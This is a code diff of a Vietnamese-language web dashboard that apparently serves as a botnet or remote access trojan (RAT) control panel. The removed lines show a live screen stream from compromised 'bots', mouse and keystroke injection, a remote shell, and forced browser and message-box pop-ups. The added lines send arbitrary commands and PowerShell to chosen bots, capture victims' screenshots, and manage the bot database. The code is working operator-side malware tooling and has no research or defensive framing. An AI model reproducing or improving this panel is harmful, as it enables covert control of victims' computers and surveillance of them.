-                    startStream();
-                } else {
-                    shellLog(`Error: ${JSON.stringify(data)}`, 'error');
-                }
-            } catch (e) {
-                shellLog(`Error: ${e.message}`, 'error');
-            }
-            
-            refreshBots();
+        function updateStats(data) {
+            const total = data.length, online = data.filter(b => b.online).length, offline = total - online, groups = new Set(data.map(b => b.group_name)).size;
+            document.getElementById('totalBots').textContent = total;
+            document.getElementById('onlineBots').textContent = online;
+            document.getElementById('offlineBots').textContent = offline;
+            document.getElementById('groupsCount').textContent = groups || 0;
         }
 
-        // --- STREAM ---
-        function startStream() {
-            if (!currentBotId) return;
-            isStreaming = true;
-            document.getElementById('placeholderText').style.display = 'none';
-            document.getElementById('statusText').textContent = 'Streaming...';
-            if (streamInterval) clearInterval(streamInterval);
-            
-            canvas.width = 1024;
-            canvas.height = 768;
-            
-            fetch(`/api/rat/stream/${currentBotId}`, { headers: getAuth() });
-            
-            streamInterval = setInterval(async () => {
-                if (!currentBotId) return;
+        function selectBot(botId) { document.getElementById('botIdInput').value = botId; }
+
+        async function deleteBot(botId) {
+            if (!confirm(`Xóa bot ${botId.slice(0,8)}...?`)) return;
+            try {
+                const res = await fetch(`/api/bots/${botId}`, { method: 'DELETE', headers: getAuth() });
+                if (res.ok) { alert('✅ Đã xóa bot'); fetchBots(); }
+            } catch (e) { alert('❌ Lỗi: ' + e.message); }
+        }
+
+        // ============================================================
+        //  POLLING - FIXED
+        // ============================================================
+        function startPolling(cmdId, isScreenshot = false) {
+            if (pollingInterval) {
+                clearInterval(pollingInterval);
+                pollingInterval = null;
+            }
+
+            let attempts = 0;
+            const maxAttempts = 25;
+            const startTime = Date.now();
+
+            pollingInterval = setInterval(async () => {
+                attempts++;
                 try {
-                    const res = await fetch(`/api/results/latest/${currentBotId}`, { headers: getAuth() });
+                    const res = await fetch(`/api/results/${cmdId}`, { headers: getAuth() });
                     const data = await res.json();
-                    if (data && data.result && data.result.startsWith('data:image')) {
-                        const img = new Image();
-                        img.onload = function() {
-                            const imgAspect = img.width / img.height;
-                            const canvasAspect = canvas.width / canvas.height;
-                            let dw, dh, ox = 0, oy = 0;
-                            if (imgAspect > canvasAspect) {
-                                dw = canvas.width;
-                                dh = canvas.width / imgAspect;
-                                oy = (canvas.height - dh) / 2;
-                            } else {
-                                dh = canvas.height;
-                                dw = canvas.height * imgAspect;
-                                ox = (canvas.width - dw) / 2;
-                            }
-                            ctx.clearRect(0, 0, canvas.width, canvas.height);
-                            ctx.drawImage(img, ox, oy, dw, dh);
-                            frameCount++;
-                            document.getElementById('statusText').textContent = 'Streaming';
-                        };
-                        img.onerror = function() { console.log('Lỗi tải ảnh'); };
-                        img.src = data.result;
+                    console.log(`[POLL] ${cmdId} attempt ${attempts}: status=${data.status}, hasResult=${!!data.result}`);
+
+                    if (data.status === 'ok' || data.status === 'error' || (data.result !== null && data.result !== undefined)) {
+                        clearInterval(pollingInterval);
+                        pollingInterval = null;
+
+                        const el = document.getElementById('cmdResultDisplay');
+
+                        if (isScreenshot && data.result && data.result.startsWith('data:image')) {
+                            el.innerHTML = `<span class="ok">✅ Ảnh đã sẵn sàng</span>`;
+                            lastScreenshotData = data.result;
+                            document.getElementById('screenshotImage').src = data.result;
+                            openModal('screenshotModal');
+                            fetchBots();
+                            return;
+                        }
+
+                        if (data.result !== null && data.result !== undefined) {
+                            const preview = data.result.length > 60 ? data.result.substring(0, 60) + '...' : data.result;
+                            el.innerHTML = `<span class="ok">✅ ${preview}</span>`;
+                            document.getElementById('resultModalTitle').textContent = '📋 Kết quả lệnh';
+                            document.getElementById('resultContent').textContent = data.result;
+                            openModal('resultModal');
+                        } else {
+                            el.innerHTML = `<span class="error">⚠️ Không có kết quả</span>`;
+                        }
+                        fetchBots();
+                        return;
                     }
-                } catch (e) { console.error('Stream error:', e); }
-            }, 500);
-            
-            setInterval(() => {
-                fps = frameCount;
-                frameCount = 0;
-                document.getElementById('fpsText').textContent = `${fps} FPS`;
+
+                    if (attempts >= maxAttempts || (Date.now() - startTime) > 25000) {
+                        clearInterval(pollingInterval);
+                        pollingInterval = null;
+                        document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">⏰ Timeout - Bot không phản hồi</span>`;
+                    }
+                } catch (e) {
+                    console.error('Polling error:', e);
+                    if (attempts >= maxAttempts) {
+                        clearInterval(pollingInterval);
+                        pollingInterval = null;
+                        document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">❌ Lỗi lấy kết quả: ${e.message}</span>`;
+                    }
+                }
             }, 1000);
         }
 
-        function stopStream() {
-            isStreaming = false;
-            if (streamInterval) {
-                clearInterval(streamInterval);
-                streamInterval = null;
-            }
-            document.getElementById('statusText').textContent = 'Stopped';
-            document.getElementById('placeholderText').style.display = 'block';
-            shellInput.disabled = true;
-            shellSendBtn.disabled = true;
-        }
-
-        async function stopRAT() {
-            if (!currentBotId) return;
-            try {
-                await fetch('/api/rat/stop', {
-                    method: 'POST',
-                    headers: { ...getAuth(), 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ bot_id: currentBotId })
-                });
-                stopStream();
-                currentBotId = null;
-                document.getElementById('currentBot').textContent = '🔴 Chưa chọn bot';
-                shellLog('RAT stopped', 'warn');
-                refreshBots();
-            } catch (e) {
-                shellLog(`Error: ${e.message}`, 'error');
-            }
-        }
-
-        // --- MOUSE EVENTS ---
-        async function sendMouseEvent(eventType, x, y) {
-            if (!currentBotId) return;
-            try {
-                await fetch('/api/rat/event', {
-                    method: 'POST',
-                    headers: { ...getAuth(), 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        bot_id: currentBotId,
-                        event_type: eventType,
-                        x: Math.round(x),
-                        y: Math.round(y)
-                    })
-                });
-            } catch (e) { console.error('Mouse event error:', e); }
-        }
-
-        canvas.addEventListener('click', (e) => {
-            if (!currentBotId || !isStreaming) return;
-            const coords = getCanvasCoords(e);
-            document.getElementById('debugCoords').textContent = `(${coords.x}, ${coords.y})`;
-            sendMouseEvent('click', coords.x, coords.y);
-        });
-
-        canvas.addEventListener('dblclick', (e) => {
-            if (!currentBotId) return;
-            const coords = getCanvasCoords(e);
-            sendMouseEvent('doubleclick', coords.x, coords.y);
-        });
-
-        canvas.addEventListener('contextmenu', (e) => {
-            e.preventDefault();
-            if (!currentBotId) return;
-            const coords = getCanvasCoords(e);
-            sendMouseEvent('rightclick', coords.x, coords.y);
-        });
-
-        canvas.addEventListener('mousemove', (e) => {
-            if (!currentBotId || !isStreaming) return;
-            const now = Date.now();
-            if (now - lastMoveTime < 30) return;
-            lastMoveTime = now;
-            const coords = getCanvasCoords(e);
-            document.getElementById('debugCoords').textContent = `(${coords.x}, ${coords.y})`;
-            sendMouseEvent('move', coords.x, coords.y);
-        });
-
-        // --- UI BUTTONS ---
-        async function sendClick(type) {
-            if (!currentBotId) return;
-            const map = { 'left': 'click', 'right': 'rightclick', 'double': 'doubleclick' };
-            await fetch('/api/rat/event', {
-                method: 'POST',
-                headers: { ...getAuth(), 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    bot_id: currentBotId,
-                    event_type: map[type] || 'click'
-                })
-            });
-        }
-
-        async function sendKeyboard() {
-            const text = document.getElementById('textInput').value.trim();
-            if (!text || !currentBotId) return;
-            await fetch('/api/rat/event', {
-                method: 'POST',
-                headers: { ...getAuth(), 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    bot_id: currentBotId,
-                    event_type: 'key',
-                    text: text
-                })
-            });
-            document.getElementById('textInput').value = '';
-            shellLog(`Key sent: ${text.substring(0, 50)}...`, 'ok');
-        }
-
         // ============================================================
-        //  SHELL - FIXED: GỬI LỆNH VÀ POLLING KẾT QUẢ
+        //  SEND COMMAND
         // ============================================================
-        async function sendShellCommand() {
-            const cmd = shellInput.value.trim();
-            if (!cmd || !currentBotId) {
-                shellLog('Chọn bot và nhập lệnh!', 'warn');
-                return;
-            }
-            if (isShellWaiting) {
-                shellLog('Đang chờ kết quả lệnh trước...', 'warn');
-                return;
-            }
-            
-            shellInput.value = '';
-            shellLog(`> ${cmd}`, 'prompt');
-            shellInput.disabled = true;
-            shellSendBtn.disabled = true;
-            isShellWaiting = true;
-            
+        async function sendCommand() {
+            const botId = document.getElementById('botIdInput').value.trim();
+            const command = document.getElementById('cmdInput').value.trim();
+            const argsRaw = document.getElementById('argsInput').value.trim();
+            let args = [];
+            try { if (argsRaw) args = JSON.parse(argsRaw); } catch (e) { alert('Args phải là JSON array hợp lệ!'); return; }
+            if (!command) { alert('Nhập lệnh đi!'); return; }
+            if (!botId) { alert('Nhập Bot ID!'); return; }
+            const bot = botsData.find(b => b.bot_id === botId);
+            if (!bot) { alert('Bot ID không tồn tại!'); return; }
+            if (!bot.online) { alert('Bot đang offline!'); return; }
+
+            document.getElementById('cmdResultDisplay').innerHTML = `<span class="pending">⏳ Đang gửi...</span>`;
+
             try {
-                const res = await fetch('/api/command/shell', {
+                const res = await fetch('/api/command', {
                     method: 'POST',
                     headers: { ...getAuth(), 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ bot_id: currentBotId, command: cmd })
+                    body: JSON.stringify({ bot_id: botId, command, args })
                 });
                 const data = await res.json();
-                
-                if (data.status === 'sent') {
-                    lastShellCmdId = data.cmd_id;
-                    shellLog(`Đã gửi, đợi kết quả... (${data.cmd_id.slice(-6)})`, 'info');
-                    
-                    // POLLING KẾT QUẢ - QUAN TRỌNG
-                    let attempts = 0;
-                    const maxAttempts = 30;
-                    const interval = setInterval(async () => {
-                        attempts++;
-                        try {
-                            const res2 = await fetch(`/api/results/${lastShellCmdId}`, { headers: getAuth() });
-                            const result = await res2.json();
-                            
-                            if (result.status === 'ok' || result.status === 'error') {
-                                clearInterval(interval);
-                                isShellWaiting = false;
-                                shellInput.disabled = false;
-                                shellSendBtn.disabled = false;
-                                shellInput.focus();
-                                
-                                if (result.result) {
-                                    shellLog(result.result, 'ok');
-                                } else {
-                                    shellLog('Không có kết quả', 'warn');
-                                }
-                                return;
-                            }
-                            
-                            if (attempts >= maxAttempts) {
-                                clearInterval(interval);
-                                isShellWaiting = false;
-                                shellInput.disabled = false;
-                                shellSendBtn.disabled = false;
-                                shellInput.focus();
-                                shellLog('Hết thời gian chờ kết quả', 'error');
-                            }
-                        } catch(e) {
-                            if (attempts >= maxAttempts) {
-                                clearInterval(interval);
-                                isShellWaiting = false;
-                                shellInput.disabled = false;
-                                shellSendBtn.disabled = false;
-                                shellInput.focus();
-                                shellLog(`Lỗi: ${e.message}`, 'error');
-                            }
-                        }
-                    }, 1000);
-                } else {
-                    isShellWaiting = false;
-                    shellInput.disabled = false;
-                    shellSendBtn.disabled = false;
-                    shellInput.focus();
-                    shellLog(`Lỗi gửi lệnh: ${data.status}`, 'error');
-                }
-            } catch (e) {
-                isShellWaiting = false;
-                shellInput.disabled = false;
-                shellSendBtn.disabled = false;
-                shellInput.focus();
-                shellLog(`Lỗi: ${e.message}`, 'error');
-            }
-        }
 
-        shellInput.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter') {
-                sendShellCommand();
-            }
-        });
-
-        // ============================================================
-        //  NOTEPAD
-        // ============================================================
-        function openNotepadModal() { openModal('notepadModal'); }
-
-        async function sendNotepad() {
-            const text = document.getElementById('notepadText').value.trim();
-            if (!text) { alert('Nhập text!'); return; }
-            if (!currentBotId) { alert('Chọn bot trước!'); return; }
-            try {
-                await fetch('/api/rat/event', {
-                    method: 'POST',
-                    headers: { ...getAuth(), 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        bot_id: currentBotId,
-                        event_type: 'notepad',
-                        text: text
-                    })
-                });
-                document.getElementById('notepadText').value = '';
-                closeModal('notepadModal');
-                shellLog(`Notepad: ${text.substring(0, 50)}...`, 'ok');
-            } catch (e) {
-                shellLog(`Lỗi: ${e.message}`, 'error');
-            }
-        }
-
-        // ============================================================
-        //  BROWSER
-        // ============================================================
-        function openBrowserModal() { openModal('browserModal'); }
-
-        async function openBrowser() {
-            const url = document.getElementById('urlInput').value.trim() || 'https://www.google.com';
-            if (!currentBotId) { alert('Chọn bot trước!'); return; }
-            try {
-                await fetch('/api/rat/event', {
-                    method: 'POST',
-                    headers: { ...getAuth(), 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        bot_id: currentBotId,
-                        event_type: 'browser',
-                        url: url
-                    })
-                });
-                document.getElementById('urlInput').value = '';
-                shellLog(`Browser: ${url}`, 'ok');
-            } catch (e) {
-                shellLog(`Lỗi: ${e.message}`, 'error');
-            }
-        }
-
-        async function openBrowserFromModal() {
-            const url = document.getElementById('browserUrlInput').value.trim() || 'https://www.google.com';
-            if (!currentBotId) { alert('Chọn bot trước!'); return; }
-            try {
-                await fetch('/api/rat/event', {
-                    method: 'POST',
-                    headers: { ...getAuth(), 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        bot_id: currentBotId,
-                        event_type: 'browser',
-                        url: url
-                    })
-                });
-                document.getElementById('browserUrlInput').value = '';
-                closeModal('browserModal');
-                shellLog(`Browser: ${url}`, 'ok');
-            } catch (e) {
-                shellLog(`Lỗi: ${e.message}`, 'error');
-            }
-        }
-
-        // ============================================================
-        //  MESSAGEBOX - FIXED: ĐÚNG THAM SỐ
-        // ============================================================
-        function openMessageBoxModal() { openModal('messageBoxModal'); }
-
-        async function sendMessageBox() {
-            const title = document.getElementById('msgTitle').value.trim() || 'Thông báo';
-            const message = document.getElementById('msgContent').value.trim();
-            const button = document.getElementById('msgButton').value.trim() || 'OK';
-            
-            if (!message) { alert('Nhập nội dung!'); return; }
-            if (!currentBotId) { alert('Chọn bot trước!'); return; }
-            
-            try {
-                const res = await fetch('/api/messagebox', {
-                    method: 'POST',
-                    headers: { ...getAuth(), 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        bot_id: currentBotId,
-                        title: title,
-                        message: message,
-                        button: button
-                    })
-                });
-                const data = await res.json();
                 if (data.status === 'sent' || data.status === 'queued') {
-                    shellLog(`MessageBox sent: "${message}" (${title})`, 'ok');
-                    document.getElementById('msgContent').value = '';
-                    closeModal('messageBoxModal');
+                    const cmdId = data.cmd_id;
+                    document.getElementById('cmdResultDisplay').innerHTML = `<span class="pending">⏳ Đã gửi, đợi... (${cmdId.slice(-6)})</span>`;
+                    const isScreenshot = (command === 'sc');
+                    startPolling(cmdId, isScreenshot);
                 } else {
-                    shellLog(`Lỗi gửi MessageBox: ${data.status}`, 'error');
+                    document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">⚠️ ${data.status}</span>`;
                 }
             } catch (e) {
-                shellLog(`Lỗi: ${e.message}`, 'error');
+                document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">❌ Lỗi: ${e.message}</span>`;
             }
         }
 
-        // --- AUTO REFRESH ---
-        setInterval(refreshBots, 10000);
-        refreshBots();
+        // ============================================================
+        //  SCREENSHOT
+        // ============================================================
+        async function takeScreenshot(botId) {
+            if (!botId) { alert('Chọn Bot ID!'); return; }
+            const bot = botsData.find(b => b.bot_id === botId);
+            if (!bot) { alert('Bot không tồn tại!'); return; }
+            if (!bot.online) { alert('Bot đang offline!'); return; }
 
+            document.getElementById('cmdResultDisplay').innerHTML = `<span class="pending">⏳ Đang chụp ảnh...</span>`;
+
+            try {
+                const res = await fetch('/api/command', {
+                    method: 'POST',
+                    headers: { ...getAuth(), 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ bot_id: botId, command: 'sc', args: [] })
+                });
+                const data = await res.json();
+
+                if (data.status === 'sent' || data.status === 'queued') {
+                    const cmdId = data.cmd_id;
+                    document.getElementById('cmdResultDisplay').innerHTML = `<span class="pending">⏳ Đã gửi, đợi ảnh... (${cmdId.slice(-6)})</span>`;
+                    startPolling(cmdId, true);
+                } else {
+                    document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">⚠️ ${data.status}</span>`;
+                }
+            } catch (e) {
+                document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">❌ Lỗi: ${e.message}</span>`;
+            }
+        }
+
+        function refreshScreenshot() {
+            const botId = document.getElementById('botIdInput').value.trim();
+            if (botId) takeScreenshot(botId);
+            else alert('Nhập Bot ID trước!');
+        }
+
+        function downloadScreenshot() {
+            if (!lastScreenshotData) return;
+            const link = document.createElement('a');
+            link.download = `screenshot_${Date.now()}.jpg`;
+            link.href = lastScreenshotData;
+            link.click();
+        }
+
+        // ============================================================
+        //  PS COMMAND
+        // ============================================================
+        function openPsModal(botId) {
+            const id = botId || document.getElementById('botIdInput').value.trim();
+            if (!id) { alert('Nhập Bot ID trước!'); return; }
+            document.getElementById('psBotIdInput').value = id;
+            document.getElementById('psCommandInput').value = '';
+            document.getElementById('psCommandInput').focus();
+            openModal('psModal');
+        }
+
+        async function sendPsCommand() {
+            const botId = document.getElementById('psBotIdInput').value.trim();
+            const command = document.getElementById('psCommandInput').value.trim();
+            if (!botId) { alert('Nhập Bot ID!'); return; }
+            if (!command) { alert('Nhập lệnh PowerShell!'); return; }
+            const bot = botsData.find(b => b.bot_id === botId);
+            if (!bot) { alert('Bot không tồn tại!'); return; }
+            if (!bot.online) { alert('Bot đang offline!'); return; }
+
+            closeModal('psModal');
+            document.getElementById('cmdResultDisplay').innerHTML = `<span class="pending">⏳ Đang gửi PS: ${command.substring(0, 30)}...</span>`;
+
+            try {
+                const res = await fetch('/api/command', {
+                    method: 'POST',
+                    headers: { ...getAuth(), 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ bot_id: botId, command: `ps ${command}`, args: [] })
+                });
+                const data = await res.json();
+
+                if (data.status === 'sent' || data.status === 'queued') {
+                    const cmdId = data.cmd_id;
+                    document.getElementById('cmdResultDisplay').innerHTML = `<span class="pending">⏳ Đã gửi PS, đợi... (${cmdId.slice(-6)})</span>`;
+                    startPolling(cmdId, false);
+                } else {
+                    document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">⚠️ ${data.status}</span>`;
+                }
+            } catch (e) {
+                document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">❌ Lỗi: ${e.message}</span>`;
+            }
+        }
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' && document.getElementById('psModal').classList.contains('active')) {
+                sendPsCommand();
+            }
+        });
+
+        // ============================================================
+        //  DB & CLEAR
+        // ============================================================
+        async function viewDB() {
+            try {
+                const res = await fetch('/api/db', { headers: getAuth() });
+                const data = await res.json();
+                document.getElementById('dbContent').textContent = JSON.stringify(data, null, 2);
+                openModal('dbModal');
+            } catch (e) { alert('Lỗi: ' + e.message); }
+        }
+
+        async function clearAllData() {
+            if (!confirm('⚠️ Xóa TOÀN BỘ database? Không thể hoàn tác!')) return;
+            if (!confirm('Xác nhận lần cuối?')) return;
+            try {
+                const res = await fetch('/api/db', { method: 'DELETE', headers: getAuth() });
+                if (res.ok) { alert('✅ Đã xóa toàn bộ'); fetchBots(); }
+            } catch (e) { alert('❌ Lỗi: ' + e.message); }
+        }
+
+        // ============================================================
+        //  MODAL CLOSE ON OVERLAY CLICK
+        // ============================================================
         document.querySelectorAll('.modal').forEach(m => {
             m.addEventListener('click', (e) => {
                 if (e.target === m) {
@@ -720,17 +429,26 @@
             });
         });
 
-        document.addEventListener('click', () => {
-            if (!shellInput.disabled) {
-                shellInput.focus();
-            }
-        });
+        // ============================================================
+        //  AUTO REFRESH
+        // ============================================================
+        setInterval(fetchBots, 5000);
+        fetchBots();
 
-        window.openBrowser = openBrowser;
-        window.sendNotepad = sendNotepad;
-        window.stopRAT = stopRAT;
-        window.sendShellCommand = sendShellCommand;
-        window.sendMessageBox = sendMessageBox;
+        // ============================================================
+        //  EXPOSE GLOBALS
+        // ============================================================
+        window.selectBot = selectBot;
+        window.deleteBot = deleteBot;
+        window.sendCommand = sendCommand;
+        window.takeScreenshot = takeScreenshot;
+        window.openPsModal = openPsModal;
+        window.sendPsCommand = sendPsCommand;
+        window.viewDB = viewDB;
+        window.clearAllData = clearAllData;
+        window.downloadScreenshot = downloadScreenshot;
+        window.refreshScreenshot = refreshScreenshot;
+        window.closeModal = closeModal;
     </script>
 </body>
 </html>
